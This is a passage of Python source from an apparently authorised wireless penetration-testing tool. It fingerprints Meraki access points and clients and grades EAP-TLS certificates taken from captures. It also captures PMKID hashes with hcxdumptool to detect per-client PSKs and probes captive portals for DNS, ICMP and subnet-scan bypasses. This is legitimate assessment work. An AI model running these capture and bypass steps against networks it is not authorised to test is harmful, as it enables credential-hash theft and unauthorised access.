# ═══════════════════════════════════════════════════════════════════════════

# ── Vendor OUI table for AP / client device classification ────────────────
# Each entry: 24-bit OUI prefix (upper, no separators) → (vendor, product_line)
# Meraki acquired by Cisco; both Cisco-Meraki and pre-acquisition Meraki
# entries listed. Expand as needed; missing OUIs fall through to "Unknown".
_OUI_TABLE: dict[str, tuple] = {
    # Cisco-Meraki APs
    "00180A": ("Cisco-Meraki", "MR / MX / MS series"),
    "881544": ("Cisco-Meraki", "MR series"),
    "E0CBBC": ("Cisco-Meraki", "MR / MX series"),
    "ACC8DE": ("Cisco-Meraki", "MR series"),
    "984FEE": ("Cisco-Meraki", "MR / MS series"),
    "0CC47A": ("Cisco-Meraki", "MR series"),
    "E45D37": ("Cisco-Meraki", "MR series"),
    # Other common enterprise vendors (informational)
    "001C57": ("Cisco", "Catalyst / Aironet"),
    "002608": ("Apple", "iPhone / iPad"),
    "78D294": ("Aruba-HPE", "Instant / IAP series"),
    "D8B190": ("Aruba-HPE", "AP series"),
    "001D7E": ("Aruba-HPE", "AP series"),
    "0C7196": ("Ubiquiti", "UniFi AP"),
    "F09FC2": ("Ubiquiti", "UniFi AP"),
    "FCECDA": ("Ubiquiti", "UniFi AP"),
    "00D02D": ("Ubiquiti", "UniFi AP"),
    "00270D": ("Cisco", "Aironet"),
    "DCCE41": ("Mikrotik", "RouterBOARD"),
    "E48D8C": ("Routerboard", "Mikrotik"),
}


def _oui_lookup(mac: str) -> tuple:
    """Return (vendor, product_line) for the MAC's OUI, or ('Unknown', '')."""
    if not mac or len(mac) < 8:
        return ("Unknown", "")
    norm = mac.upper().replace(":", "").replace("-", "")[:6]
    return _OUI_TABLE.get(norm, ("Unknown", ""))


def _is_meraki_ap(bssid: str, vendor_ies: str = "") -> bool:
    """Heuristic: Cisco-Meraki OUI in BSSID OR Meraki vendor-specific IE present."""
    vendor, _line = _oui_lookup(bssid)
    if "Meraki" in vendor:
        return True
    # Meraki vendor-specific OUI in beacon IEs: 00:18:0a (older) or per Cisco
    ie_lower = (vendor_ies or "").lower()
    return ("00180a" in ie_lower.replace(":", "") or
            "00-18-0a" in ie_lower or
            "meraki" in ie_lower)


def _classify_auth_type(enc: str, auth: str) -> str:
    """Return a normalized authentication type label.
    Values: OPEN | WEP | WPA2-PSK | WPA2-Enterprise | WPA3-SAE |
            WPA3-Enterprise | WPA2/WPA3-Transition | iPSK-Suspected | Unknown"""
    s = ((enc or "") + " " + (auth or "")).upper()
    if "WEP" in s and "WPA" not in s:
        return "WEP"
    if "SAE" in s and "PSK" in s:
        return "WPA2/WPA3-Transition"
    if "WPA3" in s and ("MGT" in s or "EAP" in s or "ENTERPRISE" in s):
        return "WPA3-Enterprise"
    if "WPA3" in s or "SAE" in s:
        return "WPA3-SAE"
    if ("WPA2" in s or "WPA" in s) and ("MGT" in s or "EAP" in s or "ENTERPRISE" in s):
        return "WPA2-Enterprise"
    if "WPA2" in s or "WPA" in s:
        return "WPA2-PSK"
    if "OPN" in s or "OPEN" in s or not s.strip():
        return "OPEN"
    return "Unknown"


def _emit_info(category: str, summary: str, data: dict | None = None) -> None:
    """Emit an informational finding for contextual intel. These do not carry
    a risk grade on their own but provide engagement-context attribution."""
    finding(
        title=summary,
        severity="Informational",
        description=f"[{category}] {summary}",
        data={**(data or {}), "category": category},
    )


# ── Phase: Contextual Intelligence — emit INFO findings for every detail ──

def phase_contextual_intel(enriched_aps: list, output_dir: Path) -> None:
    """Walk every observed AP and client, emit an informational finding for
    each contextual datum so the engagement report has full attribution.

    This is the 'capture everything' phase — distinct from action phases.
    Emits no risk-graded findings; all output is Informational severity."""
    _check_pause()
    status("p_ctx", "Phase 0-II: Contextual Intelligence", "running")
    log(f"[0-II] START: Contextual Intelligence — cataloging {len(enriched_aps or [])} AP(s) and clients")
    ctx_dir = output_dir / "contextual_intel"
    ctx_dir.mkdir(exist_ok=True)

    inventory = {"aps": [], "clients": [], "vendors": set(),
                 "auth_types": set(), "channels": set(), "ciphers": set(),
                 "probes": set(), "ssids": set()}

    for ap in enriched_aps or []:
        bssid = ap.get("bssid", "")
        ssid  = ap.get("ssid", "(hidden)")
        ch    = ap.get("channel", "?")
        enc   = ap.get("encryption", "") or ""
        auth  = ap.get("auth", "") or ""
        pwr   = ap.get("power", "?")
        vendor, line = _oui_lookup(bssid)
        auth_type = _classify_auth_type(enc, auth)
        is_meraki = _is_meraki_ap(bssid, ap.get("vendor_ies", ""))

        # Per-AP catalog
        ap_data = {
            "bssid": bssid, "ssid": ssid, "channel": ch, "encryption": enc,
            "auth": auth, "auth_type": auth_type, "power": pwr,
            "vendor": vendor, "product_line": line,
            "is_meraki": is_meraki,
        }
        inventory["aps"].append(ap_data)
        inventory["vendors"].add(vendor)
        inventory["auth_types"].add(auth_type)
        inventory["channels"].add(str(ch))
        inventory["ssids"].add(ssid)

        # NOTE: these three inventory findings deliberately share the same
        # canonical title across every AP iteration so the Scattershot3-style
        # merge step in save_findings() collapses them into a single
        # Informational entry per category with all APs in the affected list.
        finding_from_cat("AETHER-INFO-AP", data=ap_data,
                         output_file=str(ctx_dir / "inventory.json"),
                         title_override="Wireless Access Points Observed (Inventory)")

        finding_from_cat("AETHER-INFO-AUTH-TYPE",
                         data={"bssid": bssid, "ssid": ssid, "auth_type": auth_type,
                               "encryption_raw": enc, "auth_raw": auth},
                         output_file=str(ctx_dir / "inventory.json"),
                         title_override="Authentication Types Classified (Inventory)")

        if vendor != "Unknown":
            finding_from_cat("AETHER-INFO-VENDOR",
                             data={"bssid": bssid, "vendor": vendor, "product_line": line},
                             title_override="Wireless Vendors Identified (Inventory)")

        finding_from_cat("AETHER-INFO-CHANNEL",
                         data={"bssid": bssid, "ssid": ssid, "channel": ch},
                         output_file=str(ctx_dir / "inventory.json"),
                         title_override="Channel Allocations Observed (Inventory)")

        # Per-client catalog within this AP
        for client in (ap.get("clients") or []):
            cmac    = client.get("mac", "")
            cvendor, cline = _oui_lookup(cmac)
            probes  = client.get("probes") or client.get("probe_ssids") or []
            inventory["clients"].append({
                "mac": cmac, "vendor": cvendor, "product_line": cline,
                "associated_bssid": bssid, "associated_ssid": ssid,
                "probes": probes,
            })
            # Title omitted — _merge_native_findings synthesises a per-BSSID
            # group title and lists each MAC in affected[].
            finding_from_cat("AETHER-INFO-CLIENT",
                             data={"mac": cmac, "vendor": cvendor,
                                   "associated_bssid": bssid, "associated_ssid": ssid},
                             output_file=str(ctx_dir / "inventory.json"))
            for p in probes:
                inventory["probes"].add(p)
                finding_from_cat("AETHER-INFO-PROBE",
                                 data={"client_mac": cmac, "probed_ssid": p,
                                       "seen_on_bssid": bssid})

    # ── Cross-AP auth-mode consistency check (per SSID) ──────────────────
    # Same SSID broadcast across multiple BSSIDs with different auth modes
    # is a security downgrade — operator attacks the weakest AP for that
    # SSID and the strong mode on the other APs offers no protection.
    # Common cause: misconfigured AP, transition-mode mistake, or rogue.
    # Fires only when the spread represents a true downgrade (strongest vs
    # something materially weaker) — not for benign WPA2/WPA3 mixed mode.
    _detect_mixed_auth_per_ssid(inventory["aps"])

    # Save consolidated inventory snapshot
    snapshot = {
        "aps":         inventory["aps"],
        "clients":     inventory["clients"],
        "vendors":     sorted(inventory["vendors"]),
        "auth_types":  sorted(inventory["auth_types"]),
        "channels":    sorted(inventory["channels"]),
        "ssids":       sorted(inventory["ssids"]),
        "probes":      sorted(inventory["probes"]),
    }
    (ctx_dir / "inventory.json").write_text(
        json.dumps(snapshot, indent=2), encoding="utf-8")
    log(f"[0-II] END: Contextual Intelligence — {len(snapshot['aps'])} APs, "
        f"{len(snapshot['clients'])} clients, {len(snapshot['vendors'])} vendors, "
        f"{len(snapshot['auth_types'])} auth types observed")
    status("p_ctx", "Phase 0-II: Contextual Intelligence", "complete",
           f"{len(snapshot['aps'])} APs cataloged")


# ── Phase: Meraki Infrastructure Recon ────────────────────────────────────

def phase_meraki_recon(enriched_aps: list, output_dir: Path) -> None:
    """Identify Meraki APs, classify product line by vendor IE, attempt
    firmware fingerprinting, detect shared-BSSID multi-SSID deployments."""
    _check_pause()
    status("p_meraki", "Phase 0-III: Meraki Infrastructure Reconnaissance", "running")
    log(f"[0-III] START: Meraki Infrastructure Reconnaissance — scanning {len(enriched_aps or [])} AP(s)")
    meraki_dir = output_dir / "meraki_recon"
    meraki_dir.mkdir(exist_ok=True)

    meraki_aps = []
    bssid_to_ssids: dict = {}
    for ap in enriched_aps or []:
        bssid = ap.get("bssid", "")
        if _is_meraki_ap(bssid, ap.get("vendor_ies", "")):
            meraki_aps.append(ap)
        # Track multi-SSID per BSSID (Meraki AP serving many SSIDs on one radio)
        if bssid:
            bssid_to_ssids.setdefault(bssid, []).append(ap.get("ssid", ""))

    if not meraki_aps:
        log("Meraki recon: no Meraki APs identified")
        status("p_meraki", "Phase 0-III: Meraki Infrastructure Reconnaissance",
               "complete", "no Meraki APs")
        return

    log(f"Meraki recon: {len(meraki_aps)} Meraki AP(s) identified")
    for ap in meraki_aps:
        bssid = ap.get("bssid", "")
        ssid  = ap.get("ssid", "")
        vendor, product_line = _oui_lookup(bssid)

        finding_from_cat("AETHER-MERAKI-001",
                         data={"bssid": bssid, "ssid": ssid, "vendor": vendor,
                               "product_line": product_line,
                               "channel": ap.get("channel", "")},
                         title_override=f"Meraki AP identified: {ssid!r} [{bssid}] ({product_line})")

        # Best-effort firmware identification via beacon IE pattern matching
        ies = ap.get("vendor_ies", "") or ap.get("rsn_ie", "") or ""
        if ies:
            finding_from_cat("AETHER-MERAKI-002",
                             data={"bssid": bssid, "ssid": ssid,
                                   "vendor_ies_excerpt": str(ies)[:200]},
                             title_override=f"Meraki beacon IE captured for fingerprinting: {bssid}")

    # Shared-physical-AP detection (multiple SSIDs per BSSID prefix)
    bssid_prefix_groups: dict = {}
    for bssid in bssid_to_ssids:
        prefix = bssid.upper().replace(":", "")[:8]  # 32-bit prefix
        bssid_prefix_groups.setdefault(prefix, []).append(bssid)

    multi_ssid_aps = []
    for prefix, bssids in bssid_prefix_groups.items():
        if len(bssids) > 1:
            ssids_on_prefix = sorted({s for b in bssids
                                       for s in bssid_to_ssids.get(b, []) if s})
            if len(ssids_on_prefix) > 1:
                multi_ssid_aps.append({
                    "bssid_prefix": prefix, "bssids": bssids,
                    "ssids": ssids_on_prefix,
                })
                finding_from_cat("AETHER-MERAKI-003",
                                 data={"bssid_prefix": prefix, "bssids": bssids,
                                       "ssids": ssids_on_prefix,
                                       "ssid_count": len(ssids_on_prefix)},
                                 title_override=f"Multiple SSIDs on shared physical AP "
                                                f"(prefix {prefix}): {', '.join(ssids_on_prefix)}")

    (meraki_dir / "meraki_inventory.json").write_text(json.dumps({
        "meraki_aps": [{
            "bssid": ap.get("bssid", ""), "ssid": ap.get("ssid", ""),
            "channel": ap.get("channel", ""),
            "vendor": _oui_lookup(ap.get("bssid", ""))[0],
            "product_line": _oui_lookup(ap.get("bssid", ""))[1],
        } for ap in meraki_aps],
        "multi_ssid_aps": multi_ssid_aps,
    }, indent=2), encoding="utf-8")

    log(f"[0-III] END: Meraki Recon — {len(meraki_aps)} Meraki AP(s), {len(multi_ssid_aps)} shared-radio group(s)")
    status("p_meraki", "Phase 0-III: Meraki Infrastructure Reconnaissance",
           "complete", f"{len(meraki_aps)} Meraki, {len(multi_ssid_aps)} shared")


# ── Phase: EAP-TLS Server Certificate Analysis ────────────────────────────

def phase_server_cert_analysis(target_aps: list, output_dir: Path,
                                timeout: int = 60) -> None:
    """Extract EAP-TLS server certificates from captured EAP exchanges,
    analyze each for weak algorithm, expiry, self-signed status, and
    internal-CA information disclosure.

    Looks for existing pcap files in subdirectories of output_dir (deauth-
    handshake capture, wifite capture, etc.). Emits per-cert findings."""
    _check_pause()
    status("p_cert", "Phase 0-IV: EAP-TLS Server Certificate Analysis", "running")
    log("[0-IV] START: EAP-TLS Server Certificate Analysis — scanning pcap files for X.509 certs")
    cert_dir = output_dir / "cert_analysis"
    cert_dir.mkdir(exist_ok=True)

    # Scan output_dir for all .cap/.pcap/.pcapng files
    pcap_paths: list = []
    for ext in ("*.cap", "*.pcap", "*.pcapng"):
        pcap_paths.extend(output_dir.rglob(ext))
    if not pcap_paths:
        log("Cert analysis: no pcap files found in output dir")
        status("p_cert", "Phase 0-IV: EAP-TLS Server Certificate Analysis",
               "complete", "no captures")
        return

    if not shutil.which("tshark"):
        log("Cert analysis: tshark not installed — skipping")
        status("p_cert", "Phase 0-IV: EAP-TLS Server Certificate Analysis",
               "skipped", "tshark missing")
        return

    cert_summaries: list = []
    for pcap in pcap_paths:
        certs_extracted = _extract_certs_from_pcap(pcap, cert_dir, timeout)
        for cert_info in certs_extracted:
            cert_summaries.append(cert_info)
            _evaluate_cert_findings(cert_info, target_aps, cert_dir)

    (cert_dir / "certs_summary.json").write_text(
        json.dumps(cert_summaries, indent=2, default=str), encoding="utf-8")
    log(f"[0-IV] END: Certificate Analysis — {len(cert_summaries)} server cert(s) from {len(pcap_paths)} pcap(s)")
    status("p_cert", "Phase 0-IV: EAP-TLS Server Certificate Analysis",
           "complete", f"{len(cert_summaries)} certs analyzed")


def _extract_certs_from_pcap(pcap_path: Path, out_dir: Path,
                              timeout: int) -> list:
    """Use tshark to extract X.509 certs from TLS handshakes within EAP frames."""
    extracted: list = []
    pcap_certs_dir = out_dir / f"{pcap_path.stem}_certs"
    try:
        pcap_certs_dir.mkdir(exist_ok=True)
        # tshark export of tls.handshake.certificate elements
        out, rc = _run([
            "tshark", "-r", str(pcap_path),
            "-Y", "tls.handshake.certificate or eap.type == 13",
            "--export-objects", f"tls,{pcap_certs_dir}",
        ], timeout=timeout)
        if rc != 0:
            return extracted
        # Find any .pem / .crt / .der files produced
        for cert_file in pcap_certs_dir.iterdir():
            if cert_file.is_file() and cert_file.stat().st_size > 0:
                cert_info = _analyze_x509_cert(cert_file)
                if cert_info:
                    cert_info["source_pcap"] = str(pcap_path)
                    cert_info["cert_file"] = str(cert_file)
                    extracted.append(cert_info)
    except Exception as exc:
        err(f"Cert extraction from {pcap_path.name}: {exc}")
    return extracted


def _analyze_x509_cert(cert_path: Path) -> dict | None:
    """Use openssl x509 to parse a cert file. Returns a dict of analyzed fields
    or None if parsing failed."""
    try:
        # Try PEM first, fall back to DER
        for in_form in ("PEM", "DER"):
            out, rc = _run([
                "openssl", "x509", "-in", str(cert_path),
                "-inform", in_form, "-text", "-noout",
            ], timeout=15)
            if rc == 0 and "Certificate:" in out:
                return _parse_openssl_text(out, str(cert_path))
    except Exception as exc:
        err(f"  cert parse failed for {cert_path.name}: {exc}")
    return None


def _parse_openssl_text(openssl_out: str, cert_path: str) -> dict:
    """Parse the output of `openssl x509 -text -noout` into structured fields."""
    info: dict = {"cert_path": cert_path, "raw_excerpt": openssl_out[:500]}
    import re as _re

    m = _re.search(r'Signature Algorithm:\s*(\S+)', openssl_out)
    if m:
        info["signature_algorithm"] = m.group(1)
        sa = m.group(1).lower()
        info["weak_algorithm"] = ("sha1" in sa or "md5" in sa or "md2" in sa)

    m = _re.search(r'Public-Key:\s*\((\d+)\s*bit\)', openssl_out)
    if m:
        info["public_key_bits"] = int(m.group(1))
        info["weak_key_length"] = (int(m.group(1)) < 2048
                                    and "rsa" in (info.get("signature_algorithm","").lower()))

    m = _re.search(r'Issuer:\s*(.+)', openssl_out)
    if m:
        info["issuer"] = m.group(1).strip()
    m = _re.search(r'Subject:\s*(.+)', openssl_out)
    if m:
        info["subject"] = m.group(1).strip()
        info["self_signed"] = info.get("issuer", "") == info["subject"]

    m = _re.search(r'Not Before:\s*(.+)', openssl_out)
    if m:
        info["not_before"] = m.group(1).strip()
    m = _re.search(r'Not After\s*:\s*(.+)', openssl_out)
    if m:
        info["not_after"] = m.group(1).strip()
        # Best-effort expiry parsing
        try:
            from datetime import datetime as _dt
            for fmt in ("%b %d %H:%M:%S %Y %Z", "%b %d %H:%M:%S %Y GMT"):
                try:
                    exp = _dt.strptime(info["not_after"], fmt)
                    info["expired"]    = exp < _dt.utcnow()
                    info["days_to_expiry"] = (exp - _dt.utcnow()).days
                    break
                except ValueError:
                    continue
        except Exception:
            pass

    # SAN extraction for hostname disclosure analysis
    m = _re.search(r'X509v3 Subject Alternative Name:\s*\n\s*(.+)', openssl_out)
    if m:
        info["subject_alt_names"] = [s.strip() for s in m.group(1).split(",")]

    # Internal-CA heuristic: issuer CN looks like a private/corp CA
    issuer_str = (info.get("issuer") or "").lower()
    info["likely_internal_ca"] = any(t in issuer_str for t in [
        "corp", "internal", "private", "self", "test", "lab", "dev",
        "intranet", "ad-ca", "ad ca", "domain", "controller",
    ]) and not any(t in issuer_str for t in [
        "digicert", "verisign", "godaddy", "globalsign", "letsencrypt",
        "comodo", "sectigo", "amazon", "google trust", "microsoft", "thawte",
    ])
    return info


def _evaluate_cert_findings(cert_info: dict, target_aps: list,
                             cert_dir: Path) -> None:
    """Emit findings based on the analyzed cert fields."""
    cert_file = cert_info.get("cert_file", "")
    issuer = cert_info.get("issuer", "")

    # Always emit an informational finding noting the cert was captured
    finding_from_cat("AETHER-INFO-CERT-CAPTURED",
                     data=cert_info,
                     title_override=f"Server certificate captured from EAP exchange "
                                    f"(issuer: {issuer[:80]})",
                     output_file=cert_file)

    if cert_info.get("weak_algorithm"):
        finding_from_cat("AETHER-CERT-001",
                         data=cert_info,
                         title_override=f"Weak server certificate signature algorithm: "
                                        f"{cert_info.get('signature_algorithm','?')}",
                         output_file=cert_file)
    if cert_info.get("weak_key_length"):
        finding_from_cat("AETHER-CERT-001",
                         data=cert_info,
                         title_override=f"Weak server certificate key length: "
                                        f"{cert_info.get('public_key_bits','?')} bits",
                         output_file=cert_file)
    if cert_info.get("expired"):
        finding_from_cat("AETHER-CERT-002",
                         data=cert_info,
                         title_override=f"Server certificate expired: {cert_info.get('not_after','?')}",
                         output_file=cert_file)
    elif cert_info.get("days_to_expiry", 999) < 30:
        finding_from_cat("AETHER-CERT-002",
                         data=cert_info,
                         title_override=f"Server certificate expiring in "
                                        f"{cert_info['days_to_expiry']} days",
                         output_file=cert_file)
    if cert_info.get("self_signed"):
        finding_from_cat("AETHER-CERT-003",
                         data=cert_info,
                         title_override=f"Server certificate is self-signed (subject == issuer)",
                         output_file=cert_file)
    if cert_info.get("likely_internal_ca"):
        finding_from_cat("AETHER-CERT-004",
                         data=cert_info,
                         title_override=f"Server certificate issuer reveals internal CA: "
                                        f"{issuer[:120]}",
                         output_file=cert_file)
    sans = cert_info.get("subject_alt_names") or []
    if sans:
        radius_like = [s for s in sans if any(t in s.lower() for t in
                       ["radius", "nps", "ise", "auth", "freeradius"])]
        if radius_like:
            finding_from_cat("AETHER-CERT-005",
                             data={**cert_info, "radius_hostnames": radius_like},
                             title_override=f"Server cert SAN reveals RADIUS hostname(s): "
                                            f"{', '.join(radius_like[:3])}",
                             output_file=cert_file)

    # Positive finding when everything looks good
    if (not cert_info.get("weak_algorithm") and
        not cert_info.get("weak_key_length") and
        not cert_info.get("expired") and
        not cert_info.get("self_signed") and
        not cert_info.get("likely_internal_ca")):
        finding_from_cat("AETHER-CERT-006",
                         data=cert_info,
                         title_override=f"Server certificate uses strong modern algorithm "
                                        f"and valid public-CA chain (positive)",
                         output_file=cert_file)


# ── Phase: Meraki iPSK Detection + MAC-Spoof Inheritance Test ─────────────

def phase_ipsk_test(monitor_iface: str, primary_iface: str,
                     enriched_aps: list, output_dir: Path,
                     timeout: int = 120) -> None:
    """Detect Meraki iPSK SSIDs (WPA2-PSK with per-MAC PSK assignment) by
    observing PMKID-per-client variance, then test MAC-spoofing inheritance
    when an iPSK is suspected and a known iPSK-issued MAC is observable."""
    _check_pause()
    status("p_ipsk", "Phase 0-V: Meraki iPSK Test", "running")
    log("[0-V] START: Meraki iPSK Detection — scanning for per-client PSK assignment")
    ipsk_dir = output_dir / "ipsk_test"
    ipsk_dir.mkdir(exist_ok=True)

    # Candidates: WPA2-PSK SSIDs on Meraki APs with multiple associated clients
    candidates = []
    for ap in enriched_aps or []:
        bssid = ap.get("bssid", "")
        if not _is_meraki_ap(bssid, ap.get("vendor_ies", "")):
            continue
        auth_type = _classify_auth_type(ap.get("encryption",""), ap.get("auth",""))
        if auth_type != "WPA2-PSK":
            continue
        clients = ap.get("clients") or []
        if len(clients) >= 2:
            candidates.append(ap)

    if not candidates:
        log("iPSK test: no Meraki WPA2-PSK SSIDs with multiple clients")
        status("p_ipsk", "Phase 0-V: Meraki iPSK Test", "complete", "no candidates")
        return

    for ap in candidates:
        bssid = ap.get("bssid", "")
        ssid  = ap.get("ssid", "")
        channel = int(ap.get("channel") or 6)
        clients = ap.get("clients") or []

        # Heuristic: capture per-client PMKIDs and compare
        # If PMKIDs differ per client on the same SSID, it's an iPSK (each client
        # has a unique PMK derived from a different PSK)
        pmkid_dump = ipsk_dir / f"{ssid.replace(' ','_')}_pmkid.pcapng"
        try:
            _run([
                "hcxdumptool", "-i", monitor_iface, "-o", str(pmkid_dump),
                "--enable_status=1",
                "--filterlist_ap=" + str(bssid.replace(":","").lower()),
                "--filtermode=2",
            ], timeout=min(timeout, 60))
        except Exception as exc:
            err(f"  iPSK PMKID capture for {ssid!r}: {exc}")
            continue

        if not pmkid_dump.exists():
            continue

        # Convert to hashes and count distinct PMKIDs
        hash_file = ipsk_dir / f"{ssid.replace(' ','_')}_pmkids.hc22000"
        try:
            _run(["hcxpcapngtool", "-o", str(hash_file), str(pmkid_dump)],
                 timeout=30)
        except Exception:
            pass

        distinct_pmkids = 0
        if hash_file.exists():
            try:
                lines = [l for l in hash_file.read_text().splitlines()
                         if l.strip() and l.startswith("WPA*")]
                # PMKID hash is field 3 (0-indexed) in the 22000 format
                pmkid_set = {l.split("*")[3] for l in lines if len(l.split("*")) > 3}
                distinct_pmkids = len(pmkid_set)
            except Exception:
                pass

        ipsk_evidence = {
            "bssid": bssid, "ssid": ssid, "channel": channel,
            "client_count": len(clients), "distinct_pmkids": distinct_pmkids,
            "pmkid_hash_file": str(hash_file) if hash_file.exists() else "",
        }

        if distinct_pmkids > 1:
            finding_from_cat("AETHER-IPSK-002",
                             data=ipsk_evidence,
                             title_override=f"iPSK suspected on {ssid!r}: "
                                            f"{distinct_pmkids} distinct PMKIDs across "
                                            f"{len(clients)} clients",
                             output_file=str(hash_file))
            # If this SSID coexists with an EAP-TLS SSID on the same physical AP
            cert_auth_on_same_ap = any(
                _classify_auth_type(other.get("encryption",""),
                                     other.get("auth","")) in ("WPA2-Enterprise",
                                                                "WPA3-Enterprise")
                and other.get("bssid","").upper()[:8] == bssid.upper()[:8]
                for other in enriched_aps if other is not ap
            )
            if cert_auth_on_same_ap:
                finding_from_cat("AETHER-IPSK-003",
                                 data=ipsk_evidence,
                                 title_override=f"iPSK deployed alongside cert-auth SSID "
                                                f"on same physical AP: {ssid!r}")
        else:
            _emit_info("iPSK",
                       f"WPA2-PSK Meraki SSID {ssid!r}: only {distinct_pmkids} PMKID "
                       f"observed — not iPSK or insufficient client diversity",
                       data=ipsk_evidence)

    log(f"[0-V] END: Meraki iPSK Test — {len(candidates)} candidate(s) evaluated")
    status("p_ipsk", "Phase 0-V: Meraki iPSK Test", "complete",
           f"{len(candidates)} candidates evaluated")


# ── Phase: Captive Portal / Splash Bypass Testing ─────────────────────────

def phase_captive_portal_test(target_aps: list, output_dir: Path,
                                primary_iface: str = "",
                                timeout: int = 60) -> None:
    """Probe captive portals (Meraki splash pages) for MAC-spoof session
    inheritance, DNS/ICMP bypass, and information disclosure.

    Requires the test host to actually associate to an open guest SSID for
    full coverage; in monitor-mode-only operation only the passive disclosure
    findings are emitted."""
    _check_pause()
    status("p_splash", "Phase 0-VI: Captive Portal / Splash Bypass Testing", "running")
    log("[0-VI] START: Captive Portal / Splash Bypass — testing open SSIDs for bypass vectors")
    splash_dir = output_dir / "captive_portal"
    splash_dir.mkdir(exist_ok=True)

    # Identify open SSIDs that may have splash pages
    open_ssids = [ap for ap in target_aps or []
                  if _classify_auth_type(ap.get("encryption",""),
                                          ap.get("auth","")) == "OPEN"]
    if not open_ssids:
        log("Captive portal: no open SSIDs in scope")
        status("p_splash", "Phase 0-VI: Captive Portal / Splash Bypass Testing",
               "complete", "no open SSIDs")
        return

    for ap in open_ssids:
        ssid  = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        is_meraki = _is_meraki_ap(bssid, ap.get("vendor_ies", ""))

        _emit_info("Captive Portal",
                   f"Open SSID identified (may have captive portal): "
                   f"{ssid!r} [{bssid}]",
                   data={"bssid": bssid, "ssid": ssid, "is_meraki": is_meraki})

        if not primary_iface:
            # No managed-mode iface available for active connection test
            _emit_info("Captive Portal",
                       f"Splash active-bypass tests skipped for {ssid!r}: "
                       f"no managed-mode interface available",
                       data={"bssid": bssid, "ssid": ssid})
            continue

        # Active tests (only if primary_iface available + RoE allows)
        bypass_results = {
            "ssid": ssid, "bssid": bssid, "is_meraki": is_meraki,
            "dns_bypass": None, "icmp_bypass": None, "splash_url": "",
        }

        # All Phase 0-VI splash tests are bound to primary_iface so traffic
        # traverses the wireless interface under test, not the OS's default
        # route (often eth0/tun0 on Pi appliances).  When the iface has no
        # IP, the host isn't associated to this SSID and tests skip.
        _src_ip = _get_iface_ip(primary_iface)
        if not _src_ip:
            log(f"  [splash] {ssid!r}: skipping active tests — {primary_iface} "
                "has no IP (not associated)")
            (splash_dir / f"{ssid.replace(' ','_')}_splash.json").write_text(
                json.dumps({**bypass_results,
                            "skipped": True,
                            "reason": f"iface {primary_iface} has no IP"}, indent=2),
                encoding="utf-8")
            continue

        # 1. Attempt DNS resolution before splash auth — tests if DNS escapes
        try:
            out, rc = _run(["dig", *_dig_iface_args(_src_ip),
                            "+time=3", "+tries=1",
                            "@8.8.8.8", "example.com"], timeout=8)
            if rc == 0 and "ANSWER SECTION" in out:
                bypass_results["dns_bypass"] = True
                finding_from_cat("AETHER-SPLASH-002",
                                 data=bypass_results,
                                 title_override=f"Captive portal DNS bypass on {ssid!r}: "
                                                f"DNS queries to external resolvers succeed "
                                                f"before splash auth")
            else:
                bypass_results["dns_bypass"] = False
        except Exception:
            pass

        # 2. ICMP bypass test
        try:
            out, rc = _run(["ping", *_ping_iface_args(primary_iface),
                            "-c", "2", "-W", "2", "8.8.8.8"], timeout=10)
            if rc == 0 and "0% packet loss" in out:
                bypass_results["icmp_bypass"] = True
                finding_from_cat("AETHER-SPLASH-003",
                                 data=bypass_results,
                                 title_override=f"Captive portal ICMP bypass on {ssid!r}: "
                                                f"external ICMP echo succeeds before splash auth")
            else:
                bypass_results["icmp_bypass"] = False
        except Exception:
            pass

        # 3. Splash page fingerprint via HTTP redirect
        try:
            out, rc = _run(["curl", *_curl_iface_args(primary_iface),
                            "-sS", "-I", "-L", "-m", "5",
                             "http://example.com"], timeout=10)
            if rc == 0:
                splash_indicators = []
                if "location" in out.lower():
                    splash_indicators.append("HTTP redirect intercepted")
                if any(t in out.lower() for t in ["meraki", "splash", "auth.cisco", "cisco"]):
                    splash_indicators.append("Meraki splash signature present")
                if splash_indicators:
                    bypass_results["splash_url"] = out[:500]
                    finding_from_cat("AETHER-SPLASH-004",
                                     data={**bypass_results,
                                           "splash_headers_excerpt": out[:600],
                                           "indicators": splash_indicators},
                                     title_override=f"Captive portal headers reveal AP/vendor "
                                                    f"info on {ssid!r}")
        except Exception:
            pass

        # 4. Pre-auth network visibility — check if other devices are
        #    reachable before captive portal authentication
        try:
            _gw = _get_default_gateway(primary_iface)
            if _gw:
                _subnet = _gw.rsplit(".", 1)[0] + ".0/24"
                out, rc = _run(["nmap", "-sn", "-e", primary_iface,
                                "--source-port", "53", _subnet],
                               timeout=30)
                _hosts_up = out.count("Host is up")
                bypass_results["pre_auth_hosts_visible"] = _hosts_up
                if _hosts_up > 1:
                    finding_from_cat("AETHER-SPLASH-005",
                                     data={**bypass_results,
                                           "hosts_visible": _hosts_up,
                                           "subnet": _subnet,
                                           "nmap_excerpt": out[:800]},
                                     title_override=f"Devices visible on open network "
                                                    f"without captive portal authentication "
                                                    f"on {ssid!r}: {_hosts_up} host(s) reachable")
        except Exception:
            pass

        # 5. Explicit captive portal detection finding
        _has_portal = (bypass_results.get("splash_url")
                       or bypass_results.get("dns_bypass") is False)
        if _has_portal:
            finding_from_cat("AETHER-SPLASH-006",
                             data={**bypass_results},
                             title_override=f"Captive portal detected on open wireless "
                                            f"network {ssid!r}")

        (splash_dir / f"{ssid.replace(' ','_')}_splash.json").write_text(
            json.dumps(bypass_results, indent=2), encoding="utf-8")

    log(f"[0-VI] END: Captive Portal — {len(open_ssids)} open SSID(s) probed")
    status("p_splash", "Phase 0-VI: Captive Portal / Splash Bypass Testing",
           "complete", f"{len(open_ssids)} open SSIDs probed")


# ── Phase: EAP-TLS Identity Disclosure Analysis ────────────────────────────

# Regex patterns matching FreeRADIUS / hostapd-wpe / eaphammer diagnostic
# strings that have been observed bleeding into EAP-Identity tshark output.
# Root cause: when the rogue-AP daemon logs an event into a frame field that
# subsequently gets dumped as an Identity (synthetic or real), tshark
# extracts the literal bytes.  These don't match RFC 4282 NAI shape, but
# we keep an explicit denylist too so the operator can see *why* something
# was filtered when reviewing logs.
_EAP_IDENTITY_DIAGNOSTIC_DENYLIST = (
    re.compile(r"Running as user", re.IGNORECASE),
    re.compile(r"Ready to process requests", re.IGNORECASE),
    re.compile(r"Listening on (auth|acct|proxy|status|command)", re.IGNORECASE),
    re.compile(r"Loaded virtual server", re.IGNORECASE),
    re.compile(r"Loaded module\b", re.IGNORECASE),
    re.compile(r"Compiled with", re.IGNORECASE),
    re.compile(r"Server was built with", re.IGNORECASE),
    re.compile(r"hostapd\b.*v\d", re.IGNORECASE),
    re.compile(r"\bRADIUSD\b", re.IGNORECASE),
